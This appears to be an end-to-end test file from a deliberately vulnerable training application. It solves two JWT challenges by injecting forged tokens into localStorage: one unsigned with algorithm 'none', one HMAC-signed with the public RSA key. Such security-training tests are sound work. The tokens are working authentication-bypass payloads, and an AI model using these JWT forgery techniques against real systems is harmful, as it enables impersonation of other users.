describe('/', () => {
  describe('challenge "jwtUnsigned"', () => {
    it('should accept an unsigned token with email jwtn3d@juice-sh.op in the payload ', () => {
      browser.executeScript('localStorage.setItem("token", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn0sImlhdCI6MTUwODYzOTYxMiwiZXhwIjo5OTk5OTk5OTk5fQ.")')
      browser.get('/#/')
    })

    protractor.expect.challengeSolved({ challenge: 'Unsigned JWT' })
  })

  describe('challenge "jwtForged"', () => {
    it('should accept a token HMAC-signed with public RSA key with email rsa_lord@juice-sh.op in the payload ', () => {
      browser.executeScript('localStorage.setItem("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AifSwiaWF0IjoxNTA4NjM5NjEyLCJleHAiOjk5OTk5OTk5OTl9.dFeqI0EGsOecwi5Eo06dFUBtW5ziRljFgMWOCYeA8yw")')
      browser.get('/#/')
    })

    protractor.expect.challengeSolved({ challenge: 'Forged Signed JWT' })
  })
})
